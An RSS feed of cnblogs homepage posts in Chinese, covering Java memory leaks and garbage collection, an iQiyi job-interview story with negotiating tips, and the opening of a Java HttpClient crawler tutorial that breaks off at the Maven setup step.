<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>纳尼，Java 存在内存泄泄泄泄泄泄漏吗？ - 纯洁的微笑</title>
<link>http://www.cnblogs.com/ityouknow/p/10909678.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ityouknow/p/10909678.html</guid>
<description>&lt;h2 id=&quot;怎么回事&quot;&gt;01. 怎么回事？&lt;/h2&gt;
&lt;p&gt;纳尼，Java 不是自动管理内存吗？怎么可能会出现内存泄泄泄泄泄泄漏！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.itmind.net/assets/images/2019/java/nani.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Java 最牛逼的一个特性就是垃圾回收机制，不用像 C++ 需要手动管理内存，所以作为 Java 程序员很幸福，只管 New New New 即可，反正 Java 会自动回收过期的对象。。。&lt;/p&gt;
&lt;p&gt;那么 Java 都自动管理内存了，那怎么会出现内存泄漏，难道 Jvm 有 bug? 不要急，且听我慢慢道来。。&lt;/p&gt;
&lt;h2 id=&quot;怎么判断可以被回收&quot;&gt;02. 怎么判断可以被回收&lt;/h2&gt;
&lt;p&gt;先了解一下 Jvm 是怎么判断一个对象可以被回收。一般有两种方式，一种是引用计数法，一种是可达性分析。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;引用计数法&lt;/strong&gt;：每个对象有一个引用计数属性，新增一个引用时计数加1，引用释放时计数减1，计数为0时可以回收。&lt;/p&gt;
&lt;p&gt;这个办法看起来挺简单的，但是如果出现 A 引用了 B，B 又引用了 A，这时候就算他们都不再使用了，但因为相互引用 计算器=1 永远无法被回收。&lt;/p&gt;
&lt;p&gt;此方法简单，无法解决对象相互循环引用的问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.itmind.net/assets/images/2019/java/xunhuan.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可达性分析（Reachability Analysis）&lt;/strong&gt;：从 GC Roots 开始向下搜索，搜索所走过的路径称为引用链。当一个对象到 GC Roots 没有任何引用链相连时，则证明此对象是不可用的，那么虚拟机就判断是可回收对象。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.itmind.net/assets/images/2019/java/gcroot.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可达性分析可以解决循环引用的问题。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么 gc roots 对象是哪些呢&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;虚拟机栈中引用的对象&lt;/li&gt;
&lt;li&gt;方法区中类静态属性引用的对象&lt;/li&gt;
&lt;li&gt;方法区中常量引用的对象&lt;/li&gt;
&lt;li&gt;本地方法栈中JNI[即一般说的Native]引用的对象&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;目前主流的虚拟机中大多使用可达性分析的方式来判定对象是否可被 GC 回收。&lt;/p&gt;
&lt;h2 id=&quot;什么情况下会出现内存泄漏&quot;&gt;03. 什么情况下会出现内存泄漏&lt;/h2&gt;
&lt;p&gt;既然可达性分析好像已经很牛逼的样子了，怎么可能还会出现内存泄漏呢，那我们再来看一下内存泄漏的定义。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内存泄露就是指一个不再被程序使用的对象或变量一直被占据在内存中。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有可能此对象已经不使用了，但是还有其它对象保持着此对象的引用，就会导致 GC 不能回收此对象，这种情况下就会出现内存泄漏。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;写一个程序让出现内存泄漏&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;①长生命周期的对象持有短生命周期对象的引用就很可能发生内存泄露，尽管短生命周期对象已经不再需要，但是因为长生命周期对象持有它的引用而导致不能被回收。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Simple {
    Object object;
    public void method1(){
        object = new Object();
        //...其他代码
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的 object 实例，其实我们期望它只作用于 method1() 方法中，且其他地方不会再用到它，但是，当method1()方法执行完成后，object 对象所分配的内存不会马上被认为是可以被释放的对象，只有在 Simple 类创建的对象被释放后才会被释放，严格的说，这就是一种内存泄露。&lt;/p&gt;
&lt;p&gt;解决方法就是将 object 作为 method1() 方法中的局部变量。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Simple {
    Object object;
    public void method1(){
        object = new Object();
        //...其他代码
        object = null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当然大家有可能会想就这一个方法也不会有多大影响，但如果在某些项目中，一个方法在一分钟之内调用上万次的时候，就会出现很明显的内存泄漏现象。&lt;/p&gt;
&lt;p&gt;②集合中的内存泄漏，比如 HashMap、ArrayList 等，这些对象经常会发生内存泄露。比如当它们被声明为静态对象时，它们的生命周期会跟应用程序的生命周期一样长，很容易造成内存不足。&lt;/p&gt;
&lt;p&gt;下面给出了一个关于集合内存泄露的例子。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Vector v=new Vector(10);
for (int i=1;i&amp;lt;100; i++)
{
    Object o=new Object();
    v.add(o);
    o=null;
}
//此时，所有的Object对象都没有被释放，因为变量v引用这些对象。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在这个例子中，我们循环申请 Object 对象，并将所申请的对象放入一个 Vector 中，如果我们仅仅释放引用本身，那么 Vector 仍然引用该对象，所以这个对象对 GC 来说是不可回收的。&lt;/p&gt;
&lt;p&gt;因此，如果对象加入到 Vector 后，还必须从 Vector 中删除，最简单的方法就是将 Vector 对象设置为 null。&lt;/p&gt;
&lt;p&gt;以上两种是最常见的内存泄漏案例。当然还有一些内存泄漏的例子，这里就不再一一例举了，感兴趣的同学可以在网上找找资料。&lt;/p&gt;
&lt;h2 id=&quot;内存泄漏和内存溢出&quot;&gt;04. 内存泄漏和内存溢出&lt;/h2&gt;
&lt;p&gt;很多同学总是搞不清楚，内存泄漏和内存溢出的区别，它俩是两个完全不同的概念， 它们之间存在一些关联。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内存溢出 out of memory&lt;/strong&gt;，是指程序在申请内存时，没有足够的内存空间供其使用，出现 out of memory；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内存泄露 memory leak&lt;/strong&gt;，是指程序在申请内存后，无法释放已申请的内存空间，一次内存泄露危害可以忽略，但内存泄露堆积后果很严重，无论多少内存,迟早会被占光。&lt;/p&gt;
&lt;p&gt;所以内存泄漏可能会导致内存溢出，但内存溢出并不完全都是因为内存泄漏，也有可能使用了太多的大对象导致。&lt;/p&gt;
&lt;h2 id=&quot;如何检测内存泄漏&quot;&gt;05. 如何检测内存泄漏&lt;/h2&gt;
&lt;p&gt;最后一个重要的问题，就是如何检测 Java 的内存泄漏。目前，我们通常使用一些工具来检查 Java 程序的内存泄漏问题。&lt;/p&gt;
&lt;p&gt;市场上已有几种专业检查 Java 内存泄漏的工具，它们的基本工作原理大同小异，都是通过监测 Java 程序运行时，所有对象的申请、释放等动作，将内存管理的所有信息进行统计、分析、可视化。开发人员将根据这些信息判断程序是否有内存泄漏问题。&lt;/p&gt;
&lt;p&gt;这些工具包括 Plumbr 、Eclipse Memory Analyzer、JProbe Profiler、JVisualVM 等。&lt;/p&gt;
&lt;h2 id=&quot;最后&quot;&gt;06. 最后&lt;/h2&gt;
&lt;p&gt;以上内容其实是我曾经经常面试的内容之一，通过一系列的问题考察 Java 程序员对 Jvm 的理解。&lt;/p&gt;
&lt;p&gt;比如我通常会问面试者，Java 中存在内存泄漏吗？大部分人都会回答存在，接着我会问如果让你写一个程序让内存泄漏，你会怎么写？大部分程序员就回答不上来了。&lt;/p&gt;
&lt;p&gt;如果面试者可以回答上面的问题，我会接着和面试者聊聊，内存泄漏和内存溢出他们之间是否存在联系 、以及在日常工作中如何避免写出内存泄漏的代码 、如果生产出现 Jvm 相关问题时，排查问题的思路和步骤等等。&lt;/p&gt;
&lt;p&gt;这些问题在我的博客中都有答案，早些年写了一系列关于 Jvm 的文章，大家如果感兴趣的话接下来继续去阅读，&lt;a href=&quot;http://www.ityouknow.com/java.html&quot; class=&quot;uri&quot;&gt;http://www.ityouknow.com/java.html&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;如果大家觉得在手机上看着更方便，可以关注：&lt;strong&gt;Java 极客技术&lt;/strong&gt;公号，已经输出了一些 JVM 文章，我博客中的 Jvm 系列文章也都会推送到这个公号中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.itmind.net/assets/images/java.jpg&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;关注一下又不会怀孕&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考出处：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://lovoedu.gitee.io/javablog/2017/08/27/20170827/&quot; class=&quot;uri&quot;&gt;https://lovoedu.gitee.io/javablog/2017/08/27/20170827/&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/java/l-JavaMemoryLeak/index.html&quot; class=&quot;uri&quot;&gt;https://www.ibm.com/developerworks/cn/java/l-JavaMemoryLeak/index.html&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 22 May 2019 23:13:00 +0000</pubDate>
<dc:creator>纯洁的微笑</dc:creator>
<og:description>01. 怎么回事？ 纳尼，Java 不是自动管理内存吗？怎么可能会出现内存泄泄泄泄泄泄漏！ Java 最牛逼的一个特性就是垃圾回收机制，不用像 C++ 需要手动管理内存，所以作为 Java 程序员很幸</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ityouknow/p/10909678.html</dc:identifier>
</item>
<item>
<title>面试爱奇艺，竟然挂在第5轮…… - 上海小胖</title>
<link>http://www.cnblogs.com/moonhmily/p/10909666.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/moonhmily/p/10909666.html</guid>
<description>&lt;p&gt;今天给大家分享我曾经在爱奇艺的面试，过程还是比较有意思的，可以给大家一些参考&lt;/p&gt;


&lt;p&gt;嗲妹妹：你好，我是爱奇艺的HR，我们正在招聘运维开发岗位，请问您最近有在看工作机会吗？&lt;/p&gt;
&lt;p&gt;我：（这声音也太酥了吧我去……）嗯，你好，信号不太好，能在说下吗？（让我再酥一次吧）&lt;/p&gt;

&lt;p&gt;嗲妹妹：（重复）&lt;/p&gt;
&lt;p&gt;我：（我去，真的好酥啊）啊听到了，嗯，最近有在看 （不看机会，就没机会聊下去了啊）&lt;/p&gt;

&lt;p&gt;嗲妹妹：嗯嗯，那简单的介绍一下，……，公司在xxx，你看什么时候方便过来一次吗？&lt;/p&gt;
&lt;p&gt;我：可以可以，那就约在周xx吧，我应该可以，那天是你本人接见我吗？（卧槽……不由自主的就问出去了……）&lt;/p&gt;

&lt;p&gt;嗲妹妹：当然是啦，我会全程负责你的这次面试（没有这次面试几个字多好？）的，好呀，那我们周xx见咯，拜拜~&lt;/p&gt;
&lt;p&gt;我：嗯……（快不行了……）&lt;/p&gt;


&lt;p&gt;这是一个运维开发的岗位，在去之前呢，我也看了下爱奇艺的JD，讲道理，我这个人呢，还是喜欢做点准备的，如果去，就是我可能会考虑对吧，（毕竟他们除了要我，还有其他选择吗？）那最爽的结果就是手握各大厂的OFFER，然后沉浸在无法做出选择的幸福中了。&lt;/p&gt;

&lt;p&gt;那准备过程中，发现他们的要求中需要对ansible熟悉，那我之前是有用过ansible的，但是对saltstack是比较熟悉的，因为产品化的东西更吸引我，而且在工作中也用他做过二次开发，所以就去对ansible做了一些调研，然后自己写了几个playbook，包括python api调用。&lt;/p&gt;
&lt;p&gt;这里要说下，网上很多资料都是ansible 2.2 的，这个老版本了，截至发稿，已经是2.5了，其中的api调用也发生了很多的变化，&lt;strong&gt;建议大家多去看Official Guide，百度到的真的太乱&lt;/strong&gt;。这里不展开讲了。&lt;/p&gt;

&lt;p&gt;那天到了后，进入爱奇艺大厦（大厂都是有独栋的，确实不一样，下次有机会在分享其他的bilibili、鹅厂、饿了么的），就在下面等着呗&lt;/p&gt;
&lt;p&gt;然后坐了一会，来了个男的，把我接上去了（我去？？？难道电话对面就是你？变声器？这么套路的？还好呀？还嗯嗯？），领到小房间后，让我填表格什么的。&lt;/p&gt;
&lt;p&gt;我很老实的告诉大家，我全程脑子里就在循环电话那头的声音。我很低落，很难过，难道真的是jc上脑？&lt;/p&gt;
&lt;p&gt;填完单子后，就等着呗，然后那个变声男就把我的单子拿走了，然后丢了句，“稍微等下，面试官马上就来”（心想，你走吧走吧，我也差不多准备走了……）&lt;/p&gt;


&lt;p&gt;来了位个子一般的（因为我胖啊，我怕谁），做个自我介绍&lt;/p&gt;

&lt;p&gt;我觉得这个还是有说明的必要的，&lt;strong&gt;自我介绍一定要强势，一定要底气足&lt;/strong&gt;。是你们要我，不是我自己找你们的，不要搞错好伐……&lt;/p&gt;

&lt;p&gt;那么&lt;strong&gt;需要凸显的有&lt;/strong&gt;：&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;自己的项目介绍&lt;/strong&gt;（运开的话，就是CMDB、CI/CD、k8s、OpenStack，有什么吹什么，千万别不好意思）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;武器库&lt;/strong&gt;（Python什么级别？用过协程就别说多进程，用过Tornado就别说只会Django）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Q：Python的列表解析式会写吗？会的话，写一个呗。比如选出1-100中的奇数。&lt;/p&gt;
&lt;p&gt;A：[i for i in range(100) if i % 2 != 0]（其实这里有很多种做法，比如最简单的用切片就可以了 list(range(100))[1::2]都不需要列表解析式，但&lt;strong&gt;为了迎合他的问题，你得往他身上靠&lt;/strong&gt;啊……）&lt;/p&gt;
&lt;p&gt;Q：那 (i for i in range(100) if i % 2 != 0) 这个和你写的有什么区别呢？&lt;/p&gt;
&lt;p&gt;A：你现在写的是生成器解析式，返回的是一个可迭代对象，不是list对象（&lt;strong&gt;其实技术面试呢，如果你能摸到对面的小心思，那就稳了&lt;/strong&gt;呀）&lt;/p&gt;

&lt;p&gt;Q：装饰器有用过吗？用过的话，一般你是用于解决什么场景的？&lt;/p&gt;
&lt;p&gt;A：用过。典型的，用户认证，简单点的可能日志处理等。主要用来处理一类问题的时候。&lt;/p&gt;

&lt;p&gt;Q：那你能写一个装饰器吗？用来对用户的参数进行检查，如果参数类型不匹配，就返回一个error报文，否则返回success。&lt;/p&gt;
&lt;p&gt;A：好的。（就写呗。这里不以代码为主，思路很简单么，如果你用py2可能就要用attr了，但我py3 可以用inspection啊，简单啊，然后把获取到的参数检查一下类型就好了呗，但这里也有一个要求，类型是定义在函数声明时？py3.5开始的类型注解。还是写在配置文件或者函数体里面？反正我就当你用py3写了类型注解了。）&lt;/p&gt;

&lt;p&gt;……（省略一些基础问题）&lt;/p&gt;

&lt;p&gt;由上可以看出，&lt;strong&gt;面py开发，基础是很重要的&lt;/strong&gt;，因为大多自学py的，按照我的经验，对于基础部分内容掌握得不牢靠，以为py就是调调第三方库那么简单。&lt;/p&gt;
&lt;p&gt;期间还问了上下文的实现原理，还有类的使用、继承、__init__和__new__的区别，实例方法、类方法、静态方法，实力属性、类属性等等。不一一展开了。&lt;/p&gt;

&lt;p&gt;Q：你有做过CMDB吧，那你们CMDB里，如果有多套业务同时发生，你是怎么处理的？&lt;/p&gt;
&lt;p&gt;A：（&lt;strong&gt;开始问我网络和并发了，这个要能听出来&lt;/strong&gt;）我起初用的是多线程的，后来发现在处理并发的情况下，效果并不理想，就改用多进程了。但还是会有瓶颈，比如在作业模块上（&lt;strong&gt;主动抛出橄榄枝，我还做过作业平台&lt;/strong&gt;），并发比部署系统更频繁，多进程处理会直接打满服务器CPU。后来就考虑换了协程，效果非常好。&lt;/p&gt;

&lt;p&gt;Q：哦~你说到了协程，能说明一下协程和线程、进程的区别吗？&lt;/p&gt;
&lt;p&gt;A：（&lt;strong&gt;知道你要问，这不被我带节奏了么&lt;/strong&gt;）……（省略百度百科），协程主要解决的还是并发的问题，以及python GIL带来的并行处理能力。&lt;/p&gt;

&lt;p&gt;接着就让我写一个协程。那就简单的写一个生产者消费者模型呗。&lt;/p&gt;
&lt;p&gt;聊了大概四五十分钟吧。之后还聊了Django 和 前端的一些技术。感觉都ok。&lt;/p&gt;
&lt;p&gt;最后了解了下，他是负责运开的技术开发。&lt;/p&gt;


&lt;p&gt;休息过后，就来了第二位面试官，面我运维的，运开嘛，如果没有运维知识肯定是不行的。&lt;/p&gt;

&lt;p&gt;先从最简单的三次握手四次挥手问起来。&lt;/p&gt;

&lt;p&gt;接着深入一点，开始问我在一次浏览器地址输入一个链接后，到显示出页面，中间经过了哪些过程？其实就是问你DNS呗。&lt;/p&gt;
&lt;p&gt;A：先找hosts文件，如果没有就开始dns了，查询本地缓存，如果没有则向根发起查询，一层层向下请求，直到找到为止，响应给本地DNS服务器，在返回给客户端。（个人感觉dns这块回答的有点虚……相对py来说）&lt;/p&gt;

&lt;p&gt;Q：那你有做过类似nginx的配置吗？能简单说下代理或者负载均衡吗？&lt;/p&gt;
&lt;p&gt;A：nginx就自己用过，但没有生产维护过。（没有做过的话，个人建议还是老实交代为好，其实本来技术面试就有可能遇到你不会的，完全没有关系啊，只要符合要求，部分技术不合规也是没有关系的。）&lt;/p&gt;

&lt;p&gt;后来的对话中，面试官也表示，可能之前做的更多的是DB的工作，对于web容器这块不熟悉关系也不是很大。&lt;/p&gt;
&lt;p&gt;然后就和我聊起了DB，MySQL的高可用、分表，SQL优化，监控等。这些基本都回答的ok，也是老套路了，网上能查到很多，这里不做叙述。&lt;/p&gt;


&lt;p&gt;过了2轮后，竟然还有技术面，我去，是技术组长，然后还是自我介绍（不得不说，&lt;strong&gt;每轮都要自我介绍，每一轮我竟然说的还不一样&lt;/strong&gt;……）&lt;/p&gt;
&lt;p&gt;经过一些基础的可能上面两轮问过的问题后，就开始问我算法了，嗯，确实不太一样。这里我只能说靠平时积累了，有多少货就都掏出来吧！&lt;/p&gt;

&lt;p&gt;Q：现在给出一个列表,&lt;code&gt;[a,b,c,d,a,v,s,d,c,a]&lt;/code&gt;，对他进行计数，返回出现次数最多的&lt;/p&gt;
&lt;p&gt;A：嗯，我想想。然后给出了一个字典的存储方式，原因就是可以减少循环次数，尽可能降低时间复杂度。其实我一开始想说，直接用Counter模块不就好了么，但是没说出口，我知道会被打。&lt;/p&gt;

&lt;p&gt;之后就对我自己做的一个MiracleOps问了很久，主要围绕的还是实现的方式和原理，能理解啊，你做的东西，自己一个人做的，那随便问你都知道咯，（&lt;strong&gt;就是看看你是不是在吹呗，很多人会把自己参与的项目说成是自己独立完成的&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;这里就会涉及到应用层的逻辑分化，以及软件层面的架构选型。这个还是看你个人经验了，如果没啥的话尽量别硬吹，很容易吹破。&lt;/p&gt;
&lt;p&gt;比如为什么我的运维平台是用MongoDB，没用MySQL。在处理多租户、多任务的时候你是怎么解决竞争关系的。作业交付中，如果断点了怎么办，是等待还是结束？一系列的问题都值得讨论。&lt;/p&gt;

&lt;p&gt;整个三面大概也持续了要有不到一个小时。&lt;/p&gt;


&lt;p&gt;终于熬出头了，和技术总监对吹环节终于到了，和技术总监聊就有一个好处，你可以不用说具体的实现了，和“老人家”聊技术，你就得&lt;strong&gt;让他觉得你这个小伙很靠谱，思维很先进，有意思&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;我充分发挥了我12年的语文词汇，把能说的成语都套上了技术的字给丢出去了。让我谈谈理想，我就吹啊，&lt;strong&gt;我要把自己的余生交给公司，为公司开辟疆土，将运维盈利化、产业化&lt;/strong&gt;。让我们的部门成为公司最受瞩目的part，让总监你成为老板的左膀右臂！&lt;/p&gt;
&lt;p&gt;我也不知道这波吹的怎么样，反正总监是笑了。你们觉得呢？&lt;/p&gt;

&lt;p&gt;其实我觉得我更适合和总监面试，因为我这人有个毛病，喜欢吹……&lt;strong&gt;遇到同类型选手可能会激发我的斗志，通过身体的荷尔蒙喷发出更强大的吹的欲望&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;那给大家的建议就是，对于&lt;strong&gt;和总监、领导面试，放轻松点，没什么的&lt;/strong&gt;，技术都过了，总监无非就是关心一下你的家里情况，&lt;strong&gt;方便后面加班&lt;/strong&gt;咯……在关心下你的个人情况，看看身体能不能&lt;strong&gt;吃得消996&lt;/strong&gt;咯……&lt;/p&gt;
&lt;p&gt;你如果真的想进这家公司，那你面试的时候就表达出自己身体贼好，家里全部交代清楚了。当然你也可以明确说明我不加班，我不996。&lt;/p&gt;


&lt;p&gt;吹完江山，接下来就是和美人聊咯，嗯，hr小姐姐来了，和我说完大概情况后，和我开始聊起待遇，问我要多少。&lt;/p&gt;
&lt;p&gt;划重点了，大家在这个时候一定要稳住，&lt;strong&gt;千万别兜底，你自己得要有自己的底，过了咱就不伺候了&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;你可以&lt;strong&gt;在自己的工资上面稍微加一点，把平时的奖金、福利、打车报销balabala，都加在基本薪资上，毕竟涨薪和福利可没关系&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;另外，hr如果&lt;strong&gt;要你说期望，你就往高了说&lt;/strong&gt;，反正高了也会压你，低了也会压你。&lt;strong&gt;别做老好人&lt;/strong&gt;，我遇到太多读者和我抱怨要少了，后悔，也没办法了。&lt;/p&gt;

&lt;p&gt;经过一番博弈后，hr小姐姐终于问出了那句“如果薪资没有达到你的预期，你还会考虑我们公司吗？”&lt;/p&gt;
&lt;p&gt;小伙伴们，这句话你们应该不陌生对不对，千万不要方，你可以委婉的告诉他，“&lt;strong&gt;经过一天的面试，我觉得贵司的流程制度还是非常完善的，而我应聘的部门气氛也非常好，我相信我能为公司、部门带来看得到的提升，也相信公司会正确的给予我一个合理的范围&lt;/strong&gt;。”&lt;/p&gt;
&lt;p&gt;这叫什么？打太极啊！你推我，我推你，不就那回事吗，hr就懂了呀。&lt;/p&gt;
&lt;p&gt;在薪资方面我就不多说具体数字了，毕竟透露公司薪资是不道德的，反正那个薪资是在我合理涨幅里的，其实还高了一点，20%+，但我想要更多，哈哈哈。最后就考虑下呗&lt;/p&gt;


&lt;p&gt;好了，吹了一天的面试经历，到家就已经7点多了。真的累了，但我还是忘不掉那天电话里的声音。为什么始终没有出现。还是出现了我并没有发现……&lt;/p&gt;
&lt;p&gt;面试流程大体相同，不同的是技术问题，以及每个人对应的方式方法，&lt;strong&gt;给大家总结一下我的经验&lt;/strong&gt;：&lt;/p&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;技术面的时候，一定要把自己有的全都掏出来，让对面看看咱的真家伙……&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;在和总监面的时候，尽量说的眼界大些，能给部门带来收益是最好的了，但别越界了，让领导觉得你过来会威胁到他，那估计就没戏了。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;和hr再聊薪资的时候，不要过早暴露自己底线，另外hr想要知道你的期望都是ok的，但你可以多加一点，反正合不合适hr都会告诉你的，要你就会说在考虑下，或者争取下，如果不合适，你低了过去也没意思。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;希望这篇文章能给大家带来一些思考，而不是纯技术上的刷面试题。&lt;/p&gt;

&lt;p&gt;公众号「&lt;strong&gt;Python专栏&lt;/strong&gt;」后台回复：&lt;strong&gt;运维自动化平台&lt;/strong&gt;，获取MiracleOps全套代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190426060447314.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTIzNjU4Mjg=,size_16,color_FFFFFF,t_70#pic_center%20=200x200&quot; alt=&quot;python专栏&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 22 May 2019 22:37:00 +0000</pubDate>
<dc:creator>上海小胖</dc:creator>
<og:description>面试流程大体相同，不同的是技术问题，以及每个人对应的方式方法，**给大家总结一下我的经验**： - 技术面的时候，一定要把自己有的全都掏出来，让对面看看咱的真家伙…… - 在和总监面的时候</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/moonhmily/p/10909666.html</dc:identifier>
</item>
<item>
<title>Java爬虫系列二：使用HttpClient抓取页面HTML - JAVA开发老菜鸟</title>
<link>http://www.cnblogs.com/sam-uncle/p/10908567.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sam-uncle/p/10908567.html</guid>
<description>&lt;p&gt;爬虫要想爬取需要的信息，首先第一步就要抓取到页面html内容，然后对html进行分析，获取想要的内容。上一篇随笔《&lt;a href=&quot;https://www.cnblogs.com/sam-uncle/p/10908572.html&quot; target=&quot;_blank&quot;&gt;Java爬虫系列一：写在开始前&lt;/a&gt;》中提到了HttpClient可以抓取页面内容。&lt;/p&gt;
&lt;p&gt;今天就来介绍下抓取html内容的工具：HttpClient。&lt;/p&gt;
&lt;p&gt;围绕下面几个点展开：&lt;/p&gt;
&lt;ol class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;
&lt;p&gt;什么是HttpClient&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HttpClient入门实例&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;复杂应用&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;结束语&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、什么是HttpClient&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;度娘说：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;HttpClient 是Apache Jakarta Common 下的子项目，可以用来提供高效的、最新的、功能丰富的支持 HTTP 协议的客户端编程工具包，并且它支持 HTTP 协议最新的版本和建议。
以下列出的是 HttpClient 提供的主要的功能，要知道更多详细的功能可以参见 HttpClient 的官网：
（&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）实现了所有 HTTP 的方法（GET,POST,PUT,HEAD 等）
（&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）支持自动转向
（&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;）支持 HTTPS 协议
（&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;）支持代理服务器等
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里面提到了官网，那就顺便说下它官网上的一些东西。&lt;/p&gt;
&lt;p&gt;根据百度给出的HomePage是这个：&lt;a href=&quot;http://hc.apache.org/httpclient-3.x/&quot;&gt;http://hc.apache.org/httpclient-3.x/&lt;/a&gt;，但是进入后你会发现有句话&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1345071/201905/1345071-20190522214726551-1209646611.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;大意是：Commons HttpClient这个项目已经不再维护了，它已经被Apache HttpComponents替代了。也就是说我们以后要用的话就用新的。点这个Apache HttpComponents的链接进去能看到它最新的版本是4.5，而且有快速上手的例子和专业的说明文档。有兴趣并且英文好的朋友可以好好研究下哦 ~~&lt;img src=&quot;https://img2018.cnblogs.com/blog/1345071/201905/1345071-20190522215025389-1197915877.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;额~~那个~~我的英文不好，就不按照官网的来了，直接给出我自己在网上学的练习案例~~&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;二、HttpClient入门实例&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;新建一个普通的maven项目：名字随便起，我的叫：httpclient_learn&lt;/li&gt;
&lt;li readability=&quot;-1.5&quot;&gt;修改pom文件，引入依赖
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
